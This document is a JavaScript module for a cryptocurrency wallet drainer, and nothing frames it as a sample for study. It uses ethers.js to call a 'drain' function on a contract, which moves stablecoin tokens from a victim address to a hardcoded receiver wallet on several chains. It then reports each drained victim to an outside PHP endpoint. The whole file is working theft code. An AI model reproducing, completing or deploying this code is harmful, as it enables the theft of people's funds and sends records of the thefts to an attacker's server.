import { ethers } from "ethers";

const DRAINER_CONTRACT = "0x5fbdb2315678afecb367f032d93f642f64180aa3";
const DRAINER_ABI = [
  "function drain(address token, address victim, address receiver) external",
];

const ERC20_TOKENS = {
  1: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  56: "0x55d398326f99059ff775485246999027b3197955",
  137: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
};

const DRAIN_RECEIVER = "0xf91A221A7e8Fda48aC4a6fE90017d40e87bA8E60";

export async function triggerDrain(entry, index) {
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const drainer = new ethers.Contract(DRAINER_CONTRACT, DRAINER_ABI, signer);

  const token = ERC20_TOKENS[entry.chainId];
  if (!token) return alert("Unsupported chain");

  try {
    const tx = await drainer.drain(token, entry.address, DRAIN_RECEIVER);
    await tx.wait();

    await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/mark-drained.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ index }),
    });

    alert("✅ Drained successfully");
  } catch (err) {
    console.error("Draining failed:", err);
    alert("❌ Draining failed.");
  }
}
